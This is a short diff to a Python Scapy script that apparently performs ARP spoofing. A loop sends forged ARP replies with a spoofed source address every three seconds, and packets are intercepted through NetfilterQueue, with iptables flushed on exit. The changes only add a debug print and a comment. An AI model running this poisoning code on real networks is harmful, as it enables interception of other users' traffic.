@@ -16,6 +16,7 @@ load_layer("http")
 
 def ARP_loop(tar, ser):
     while not finished:
+        print(f"\nsending arp with pdst: {tar} and psrc: {ser}")
         sendp(ARP(op=2, pdst=tar, psrc=ser), iface=interface, verbose=False)
         time.sleep(3)
 
@@ -88,7 +89,8 @@ try:
     thread3.start()
 
     nfqueue = NetfilterQueue()                       
-    nfqueue.bind(1, q_callback)                        
+    nfqueue.bind(1, q_callback)    
+    #Running filter queue                    
     nfqueue.run()                                      
 except KeyboardInterrupt:
     os.system('iptables -F')                     # flush all iptables rule
